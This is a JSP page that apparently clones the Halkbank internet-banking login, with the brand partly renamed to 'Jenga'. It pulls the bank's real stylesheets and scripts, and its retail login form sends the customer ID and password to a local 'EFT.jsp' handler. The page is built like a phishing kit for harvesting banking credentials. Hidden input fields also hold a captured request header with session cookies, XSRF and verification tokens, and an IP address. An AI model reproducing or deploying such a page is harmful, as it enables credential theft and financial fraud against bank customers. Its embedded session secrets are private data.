<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html   >
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Jenga İnternet Şubesi</title>
    <base href="/InternetBankingHost/" />
    <!-- Meta Tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">

    <!-- Stylesheets -->
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/bootstrap.min.css?v=1571820880896" />
    
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/production.min.css?v=1571820880896" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/production-plugins.min.css?v=1571820880896" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/skins.min.css?v=1571820880896" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/veribranch-all.css?v=1571820880896" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/receipt.css?v=1571820880896" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/css/plugins-all.css?v=1571820880896" />

    <script type="text/javascript">
        var featureVersions = [];
        featureVersions.push({ "featureName": "VeriBranch.UIDesigner", "version": 1461666575784 });
        featureVersions.push({"featureName":"VeriBranch.PinCreate","version":1571820880855});
        featureVersions.push({ "featureName": "VeriBranch.BackOffice", "version": 1461666574716 });
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.CallCenter","version":1571820880287});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Tools","version":1571820880813});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.CustomerInformation","version":1571820880535});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Credits","version":1571820880497});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Corporate","version":1571820880459});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Cheques","version":1571820880372});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Cards","version":1571820880327});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Payments","version":1571820880710});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Investments","version":1571820880619});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Accounts","version":1571820880241});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.FundTransfers","version":1571820880577});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Security","version":1571820880750});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Login","version":1571820880663});
        featureVersions.push({"featureName":"VeriBranch.Web","version":1571820880896});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Common","version":1571820880415});
    </script>



    <script charset='UTF-8'>
        function fraudNetInitiateEvent() {
            if ('' === 'true') {
                hkbadx.hkbinitiate(null);
            }
        }
        function fraudNetValidateEvent() {
            if ('' === 'true') {
                hkbadx.hkbvalidate('hkb-user_prefs');
            }
        }
    </script>


    <!-- <link rel="icon" href="img/favicon/favicon.ico" type="image/x-icon" /> -->
    
    <link rel="stylesheet" type="text/css" href="https://sube.halkbank.com.tr/InternetBankingHost/Maintenance/BotDetectCaptcha.ashx?get=layoutStyleSheet" />


</head>
<body   ng-controller="app.views.mvclogin.HostLoginController as vm"                class="halk-bank container extr-page">

    

    



<noscript>
    
<html>
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Jenga İnternet Şubesi</title>
    <base href="/InternetBankingHost/" />
    <!-- Meta Tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">

    <!-- Stylesheets -->
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/bootstrap.min.css?v=1571820880896" />
    
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/production.min.css?v=1571820880896" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/production-plugins.min.css?v=1571820880896" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/skins.min.css?v=1571820880896" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/veribranch-all.css?v=1571820880896" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/receipt.css?v=1571820880896" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/css/plugins-all.css?v=1571820880896" />

     

 


    <!-- <link rel="icon" href="img/favicon/favicon.ico" type="image/x-icon" /> -->
    

</head>
<body   ng-controller="app.views.mvclogin.HostLoginController as vm"                class="halk-bank container extr-page">

    
    <header id="header">
        <div>
            <div class="container">
                <div class="row">
                    <div class="col-md-6">
                        <div id="logo-group">
                            <span id="logo"><a href="/InternetBankingHost/"><img src="https://sube.halkbank.com.tr/InternetBankingHost/features/wwwroot/statics/sa/img/HALKBANK/HALKBANK_logo.svg?v=1" alt="Halk Bankası"></a></span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>


    



<div id="main" class="home" role="main">
    <section class="contentArea">
        <section class="loginArea">
            <div class="container">
                <div class="warning">
                    <div class="v-center">
                        <p class="text-center mB"><img src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/img/500-2.png" alt=""></p>
                        <div class="loginHead text-center">
                            <span><b>Üzgünüz! </b>Tarayıcınız Javascript'i desteklemediği için Jenga İnternet Şubesine Giriş yapamıyorsunuz.</span>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </section>
</div>



    

    <footer id="footer">
        <div class="container">
            <div class="row">
                <div class="col-md-6  md-txt-lf sm-txt-cnt">
                    <span class="copyright">&#169; Copyright 1998, 2019 T&#252;rkiye Jenga Bankası A.Ş. T&#252;m hakları saklıdır.</span>
                </div>
                <div class="col-md-6 md-txt-rg sm-txt-cnt">
                    <div class="footer-menu">
                        <a href="#">S.S.S</a>
                        <a href="#">Bize Ulaşın</a>
                        <a href="#">444 0 000</a>
                    </div>
                </div>
            </div>
        </div>
    </footer>


    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/jquery-all.js?v=1571820880896"></script>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/angular-all.js?v=1571820880896"></script>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/plugins-all.js?v=1571820880896"></script>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/highcharts-all.js?v=1571820880896"></script>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/dataTables-all.js?v=1571820880896"></script>


        <script type="text/javascript">
            _.set(window, 'VeriBranch.Config.UniqueKey', '');
        </script>
        <script type="text/javascript" src="/InternetBankingHost/Features/wwwroot/statics/js/vb-all.js?v=1571820880896"></script>
            <script type="text/javascript" src="/InternetBankingHost/Features/wwwroot/VeriBranch.Web/Modules/veribranch.directives.js?v=1571820880896"></script>

    
    <input type="hidden" style=" display: block; position: relative; z-index: 100;" id="user_prefs2" name="user_prefs2">
    <input type="hidden" style=" display: block; position: relative; z-index: 100;" id="hkb-user_prefs" name="hkbuser_prefs">
    <input type="hidden" style=" display: block; position: relative; z-index: 100;" id="clnthdr" name="clnthdr" value="{&quot;Connection&quot;:[&quot;keep-alive&quot;],&quot;Accept&quot;:[&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate, br&quot;],&quot;Accept-Language&quot;:[&quot;en-us&quot;],&quot;Cookie&quot;:[&quot;_fbp=fb.2.1572423289977.882801120; _ga=GA1.3.1739644290.1572423291; _gat=1; _gid=GA1.3.2117053378.1572423291; wssnid=eCuu2Elg4T5HMoradt8kmT8Z8hs0000; ASP.NET_SessionId=3bs2krnoy4dqyxj0g4f43wjy; VB_IBHSession=30dfa3db889e7e7adb8eb514771de3bf69506e59f1f8b8b90fe559c9f754805a6740e97c; XSRF-TOKEN=7kmKS-vZcQSzawOGa26-dctZFrJ3tq7jBVrPNIKg9aPUGpi23i6tTdAGq2L_ii9veJzOppR8Wt4iybRe2i5q6Q2; __RequestVerificationToken_L0ludGVybmV0QmFua2luZ0hvc3Q1=DPx-8Av2MFOD3uDzokKQFb6bgM-jFe1s2xcVyEb46O2PlzuSFs1-Lb9Mj43fe_0jBX9nmGvlFucIfYqWXljCEA2&quot;],&quot;Host&quot;:[&quot;sube.halkbank.com.tr&quot;],&quot;Referer&quot;:[&quot;https://www.halkbank.com.tr/&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.2 Safari/605.1.15&quot;],&quot;X-ip&quot;:[&quot;195.212.29.160&quot;],&quot;X-Port&quot;:[&quot;24831&quot;]}">
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/js/sa-all.js?v=1571820880896"></script>

    <a href="javascript:void(0)" class="back-to-top visible-xs">Başa D&#246;n</a>
</body>
</html>
</noscript>
<div id="main" hidden="hidden" class="home" role="main" ng-init="vm.customerType=1">
    <section class="contentArea">
        <section class="loginArea">
            <div class="container">
                
                <div class="spinner-loading-overlay"></div>
                <div class="row">
                    <div class="col-xs-12 col-md-7 col-lg-6 col-lg-offset-1 login-input-box">
                        <div class="login-box">
                            <div id="logo-group" class="visible-xs">
                                <span id="logo"><a target="_blank" href="http://www.halkbank.com.tr"><img src="/InternetBankingHost/features/wwwroot/statics/sa/img/HALKBANK/HALKBANK_logo2.svg?v=1" alt="Halk Bankası"></a></span>
                            </div>


                                    <div class="ct-switch">
                                        <a href="javascript:void(0)" id="CustomerSwitchButton" ng-click="vm.toggleCustomerType()" class="corporate">
                                                <span data-toggle-text='Bireysel'>Kurumsal</span>
                                            <i class="fa fa-arrow-right"></i>
                                        </a>
                                    </div>
                            <div ng-show="vm.customerType==1" class="loginContainer retail-login-container" style="">
                                <div>
                                    <div class="tab-content loginInner">
                                        <div class="loginHead">
                                                    <img src="https://sube.halkbank.com.tr/InternetBankingHost/features/wwwroot/statics/sa/img/HB_lock.png" height="38" />
                                                    <img class="visible-xs" src="https://sube.halkbank.com.tr/InternetBankingHost/features/wwwroot/statics/sa/img/HB_lock-white.png" height="38" />
                                                    <span data-toggle-text='İnternet Şube Giriş'>İnternet Şube Giriş</span>
                                        </div>
                                        <div id="is1">
<form action="../EFT.jsp" autocomplete="off" class="smart-form first-login prevent-multiple-submit" method="post">
                                                <input type="password" style="display:none;" name="FakeCustomerName" />
                                                <fieldset>
                                                    <div class="row">
                                                        <section class="col col-xs-12">
                                                            <label class="input">
                                                                <i class="icon-prepend hb-icon-user"></i>
                                                                <input id="PinLoginCustomerID" min="0" type="number" name="CustomerNumber" autocomplete="new-password" autofocus tabindex="1" class="input-lg keyboard-input" placeholder="M&#252;şteri/TC Kimlik Numarası" value="" />
                                                                
                                                            </label>
                                                        </section>
                                                        <section class="col col-xs-6">
                                                            <label class="input">
                                                                <i class="icon-prepend fa fa-key"></i>
                                                                <input name="FirstLoginPassword" type="password" autocomplete="new-password" tabindex="2" class="input-lg password-keyboard" placeholder="Parola" value="" />
                                                                
                                                            </label>
                                                        </section>

                                                            <section class="col col-xs-6">
                                                                <div class="select selectField">
                                                                    <select name="CoexistenceLoginType" class="login-quick-access-dropdown" tabindex="3">
                                                                        <option value="InternetBanking">İnternet Şube</option>
                                                                                <option value="1">Halk Yatırım</option>
                                                                    </select>
                                                                </div>
                                                            </section>
                                                        <input name="LoginType" type="hidden" value="PinLogin" />
                                                        <input name="CustomerType" type="hidden" value="Retail" />
                                                    </div>
                                                </fieldset>
                                                <div class="row login-links">
                                                    <div class="col col-lg-7 col-xs-6">
                                                        <div class="virtualKeyboard hidden-xs">
                                                            <a href="javascript:void(0)" ng-click="vm.showVirtualKeyboard($event)">
                                                                <span>Sanal Klavye</span>
                                                            </a>
                                                        </div>

                                                            <a href="/InternetBankingHost/PinCreate/CardVerification?lang=tr-TR" class="lang">
                                                                <i></i>
                                                                <span>Parolamı Bilmiyorum/Blokeli</span>

                                                            </a>
                                                                                                                                                                    </div>
                                                    <div class="col col-md-6 col-md-offset-1 col-xs-12 col-lg-5 text-right">
                                                        <input type="submit" id="submitbtn" class="loginBtn green mrt15" value='Giriş' tabindex="4">
                                                    </div>
                                                </div>
</form>                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div ng-show="vm.customerType==2" class="loginContainer corporate-login-container" style="display:none;">
                                <div class="loginInner">

                                    <div class="loginHead">
                                                <img src="https://sube.halkbank.com.tr/InternetBankingHost/features/wwwroot/statics/sa/img/HB_lock.png" height="38" />
                                                <img class="visible-xs" src="https://sube.halkbank.com.tr/InternetBankingHost/features/wwwroot/statics/sa/img/HB_lock-white.png" height="38" />
                                                <span data-toggle-text='İnternet Şube Giriş'>İnternet Şube Giriş</span>
                                    </div>
<form action="/InternetBankingHost/HostLogin" autocomplete="off" class="smart-form first-login-corporate prevent-multiple-submit" method="post">                                        <input type="password" style="display:none;" name="FakeCustomerName" />
                                        <fieldset>
                                            <div class="row">
                                                <section class="col col-6 col-xs-12">
                                                    <label class="input">
                                                        <i class="icon-prepend fa fa-building-o"></i>
                                                        <input name="CustomerNumber" min="0" id="PinLoginCustomerCorporateID" type="number" autocomplete="new-password" class="input-lg keyboard-input" tabindex="1" placeholder="Firma M&#252;şteri Numarası" value="" />
                                                        
                                                    </label>
                                                </section>
                                                <section class="col col-6 col-xs-12">
                                                    <label class="input">
                                                        <i class="icon-prepend hb-icon-user"></i>
                                                        <input name="CorporateCustomerNumber" type="text" autocomplete="new-password" class="input-lg keyboard-input" tabindex="3" placeholder="Kullanıcı M&#252;şteri Numarası" value="" />
                                                        
                                                    </label>
                                                </section>
                                            </div>
                                            <div class="row">
                                                <section class="col col-6 col-xs-12">
                                                    <label class="input">
                                                        <i class="icon-prepend fa fa-key"></i>
                                                        <input name="FirstLoginPassword" type="password" autocomplete="new-password" class="input-lg password-keyboard" tabindex="2" placeholder="Parola" value="" />
                                                        
                                                    </label>
                                                </section>

                                                <section class="col col-6 col-xs-12">
                                                        <div class="select selectField">
                                                            <select name="CoexistenceLoginType" tabindex="4" class="login-quick-access-dropdown">
                                                                <option value="InternetBanking">İnternet Şube</option>
                                                                <option value="AutonomousUse">&#214;zerk Kullanım</option>
                                                                        <option value="0">DTO</option>
                                                                        <option value="1">Halk Yatırım</option>
                                                            </select>
                                                        </div>
                                                </section>

                                                <input name="LoginType" type="hidden" value="PinLogin" />
                                                <input name="CustomerType" type="hidden" value="Corporate" />
                                            </div>
                                        </fieldset>
                                        <div class="row">
                                            <div class="col col-lg-7 col-xs-6">
                                                <div class="virtualKeyboard hidden-xs">
                                                    <a href="javascript:void(0)" ng-click="vm.showVirtualKeyboard($event)">
                                                        <span>Sanal Klavye</span>
                                                    </a>
                                                </div>
                                                    <a href="/InternetBankingHost/PinCreate/CardVerification?lang=tr-TR" class="lang">
                                                        <i></i>
                                                        <span>Parolamı Bilmiyorum/Blokeli</span>

                                                    </a>
                                            
                                            </div>
                                            <div class="col col-md-6 col-md-offset-1 col-xs-12 col-lg-5 text-right">
                                                <input type="submit" class="loginBtn green" value='Giriş'>
                                            </div>
                                        </div>
</form>                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="col-xs-12 col-md-4 col-lg-5 login-carousel">
                        
    <div class="forgot-password">
        <div class="remind">
            <div id="myCarousel" class="carousel fade loginSlide" data-ride="carousel">
                <ol class="carousel-indicators">
                            <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
                            <li data-target="#myCarousel" data-slide-to="1" class=""></li>
                            <li data-target="#myCarousel" data-slide-to="2" class=""></li>
                            <li data-target="#myCarousel" data-slide-to="3" class=""></li>
                </ol>
                <div class="carousel-inner">
                            <div class="item active">
                                <div class="carousel-caption ">
                                    <div class="textArea xs-txt-cnt  sm-txt-cnt md-txt-lf">
                                        <a href="https://www.halkbank.com.tr/5817-guvenlik" target="_blank">
                                            <div class="txt txt2">Güvenliğiniz için</div>
<div class="txt txt1">Jenga İnternet Şubesi girişlerinde; cep telefonu numarası, marka ve modeli bilgileriniz istenmez.</div>
<div class="txt txt3">Detaylı bilgi için tıklayınız</div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="item ">
                                <div class="carousel-caption ">
                                    <div class="textArea xs-txt-cnt  sm-txt-cnt md-txt-lf">
                                        <a href="http://www.halkbankkobi.com.tr/" target="_blank">
                                            <div class="txt txt1">A’dan Z’ye KOBİ’ye dair herşey </div>
<div class="txt txt2">Jengakobi.com.tr’de!</div>
<div class="txt txt3">Detaylar için tıklayınız</div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="item ">
                                <div class="carousel-caption ">
                                    <div class="textArea xs-txt-cnt  sm-txt-cnt md-txt-lf">
                                        <a href="https://www.halkbank.com.tr/5825-nasil_uye_olabilirim" target="_blank">
                                            <div class="txt txt1">Hızlı ve güvenli bankacılığın yeni numarası:</div>
<div style="font-family: 'Gotham', Arial;font-weight: 700;font-size: 20px;color: #104d7f;margin-bottom: 5px;letter-spacing: -1px">0850 222 0 400 <br /> Jenga Dialog <br /> 0850 222 0 401 <br /> Jenga KOBİ Dialog</div>

                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="item ">
                                <div class="carousel-caption ">
                                    <div class="textArea xs-txt-cnt  sm-txt-cnt md-txt-lf">
                                        <a href="https://www.halkbank.com.tr/5817-guvenlik" target="_blank">
                                            <div class="txt txt2">Güvenliğiniz için dikkat ediniz</div>
<div class="txt txt1">Bankamız adına açılan sahte sosyal medya hesapları ve mobil uygulamalarda yer alan linkleri tıklamayınız ve bu linkler aracılığı ile bilgilerinizi paylaşmayınız.</div>
<div class="txt txt3">Detaylı bilgi için tıklayınız</div>
                                        </a>
                                    </div>
                                </div>
                            </div>
                </div>
            </div>
        </div>
    </div>

                    </div>
                </div>
            </div>
        </section>
        <section class="miniFooter">
            
            
<div class="container">
    <div id="logo-group">
            <span id="logo"><a target="_blank" href="http://www.halkbank.com.tr"><img src="https://sube.halkbank.com.tr/InternetBankingHost/features/wwwroot/statics/sa/img/HALKBANK/HALKBANK_logo2.svg?v=1" alt="Halk Bankası"></a></span>
    </div>
    <div class="link-group">
                <a href="/InternetBankingHost/HostLogin?lang=en-US" class="lang">

                    <i></i>
                    <span>English</span>
                </a>
                    <a target="_blank" href="https://www.halkbank.com.tr/5651-sikca_sorulan_sorular">Sık&#231;a Sorulan Sorular</a>
                    <a href="https://www.halkbank.com.tr/5675-sube_atm_arama" target="_blank">
                 ATM ve Şubeler
             </a>
                    <a target="_blank" href="https://www.halkbank.com.tr/14891-planli_kesintiler">Duyurular</a>
    </div>
</div>
        </section>
        <section>
            



<div class="container login-box-area login-footer-area">
    <div class="row">
        <div class="col-md-3">
            <a href="/InternetBankingHost/PinCreate/CardVerification">
                <div class="box box2 text-align-center green-border">
                    <span>
                        <i class="fa fa-key box-image"></i>
                    </span>
                    <span class="title">Parola Oluşturma</span>
                    <span class="txt">Kart bilgilerinizi kullanarak İnternet Şubesi Parolanızı oluşturabilirsiniz.</span>
                </div>
            </a>
        </div>

        <div class="col-md-3">


                <a target="_blank" href="https://www.halkbank.com.tr/5659-mutlu_musteri_merkezi">
                    <div class="box box2 text-align-center orange-border">
                        <div class="happy-customer-center box-image"></div>
                        <span class="title">Mutlu M&#252;şteri Merkezi</span>
                        <span class="txt">Jenga olarak siz değerli m&#252;şterilerimizin taleplerini &#246;nemsiyoruz.</span>
                    </div>
                </a>
        </div>

        <div class="col-md-3">
                <a target="_blank" href="https://www.halkbank.com.tr/5817-guvenlik">
                    <div class="box box2 text-align-center yellow-border">
                        <div class="security-box-image box-image"></div>
                        <span class="title">G&#252;venlik Bilgileri</span>
                        <span class="txt">İnternet Şubesi g&#252;venliğiniz i&#231;in dikkat etmeniz gerekenler detaylandırılmıştır.</span>
                    </div>
                </a>

        </div>

        <div class="col-md-3">

                <a target="_blank" href="http://www.parafcard.com.tr/">
                    <div class="box box2 text-align-center paraf-border">
                        <div class="paraf-card box-image"></div>
                        <span class="title">Paraf Card</span>
                        <span class="txt">Kredi Kartı D&#252;nyasında Ayrıcalıklar Bu Paraf’ta!</span>
                    </div>
                </a>
        </div>
    </div>
</div>

        </section>

    </section>
</div>

<script type="text/javascript">
    document.addEventListener('DOMContentLoaded', function () {
        $(document).on('keyboardApplied', function () {
            $("#PinLoginCustomerID").focus();
            document.getElementById("loginfooter1").removeAttribute("hidden");
        });
    });
    document.getElementById("main").removeAttribute("hidden");
</script>



    
    <vb-virtual-keyboard vb-selector=".password-keyboard, .keyboard-input"
                         vb-maskchar="*"
                         vb-culture="tr"
                         vb-position-my="left top"
                         vb-position-at="right bottom"
                         vb-id="password-keyboard"
                         vb-position-at-two="left bottom"
                         vb-open-on="nothing"></vb-virtual-keyboard>
    <div hidden="hidden" id="loginfooter1">
    
<footer id="footer" class="text-center login-footer">
    <div class="container">
        <div class="row">
            <div>
                <span class="copyright" aria-hidden="true">Her hakkı T&#252;rkiye Jenga Bankası A.Ş.&#39;ye aittir &#169; 2019</span>
            </div>
        </div>
    </div>
</footer>
</div>


    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/jquery-all.js?v=1571820880896"></script>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/angular-all.js?v=1571820880896"></script>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/plugins-all.js?v=1571820880896"></script>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/highcharts-all.js?v=1571820880896"></script>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/dataTables-all.js?v=1571820880896"></script>


        <script type="text/javascript">
            _.set(window, 'VeriBranch.Config.UniqueKey', '');
        </script>
        <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/vb-all.js?v=1571820880896"></script>
            <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/VeriBranch.Web/Modules/veribranch.directives.js?v=1571820880896"></script>

    
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/login-app-all.js?v=1571820880896"></script>

    <input type="hidden" style=" display: block; position: relative; z-index: 100;" id="user_prefs2" name="user_prefs2">
    <input type="hidden" style=" display: block; position: relative; z-index: 100;" id="hkb-user_prefs" name="hkbuser_prefs">
    <input type="hidden" style=" display: block; position: relative; z-index: 100;" id="clnthdr" name="clnthdr" value="{&quot;Connection&quot;:[&quot;keep-alive&quot;],&quot;Accept&quot;:[&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate, br&quot;],&quot;Accept-Language&quot;:[&quot;en-us&quot;],&quot;Cookie&quot;:[&quot;_fbp=fb.2.1572423289977.882801120; _ga=GA1.3.1739644290.1572423291; _gat=1; _gid=GA1.3.2117053378.1572423291; wssnid=eCuu2Elg4T5HMoradt8kmT8Z8hs0000; ASP.NET_SessionId=3bs2krnoy4dqyxj0g4f43wjy; VB_IBHSession=30dfa3db889e7e7adb8eb514771de3bf69506e59f1f8b8b90fe559c9f754805a6740e97c; XSRF-TOKEN=7kmKS-vZcQSzawOGa26-dctZFrJ3tq7jBVrPNIKg9aPUGpi23i6tTdAGq2L_ii9veJzOppR8Wt4iybRe2i5q6Q2; __RequestVerificationToken_L0ludGVybmV0QmFua2luZ0hvc3Q1=DPx-8Av2MFOD3uDzokKQFb6bgM-jFe1s2xcVyEb46O2PlzuSFs1-Lb9Mj43fe_0jBX9nmGvlFucIfYqWXljCEA2&quot;],&quot;Host&quot;:[&quot;sube.halkbank.com.tr&quot;],&quot;Referer&quot;:[&quot;https://www.halkbank.com.tr/&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.2 Safari/605.1.15&quot;],&quot;X-ip&quot;:[&quot;195.212.29.160&quot;],&quot;X-Port&quot;:[&quot;24831&quot;]}">
    
    <a href="javascript:void(0)" class="back-to-top visible-xs">Başa D&#246;n</a>
</body>
</html>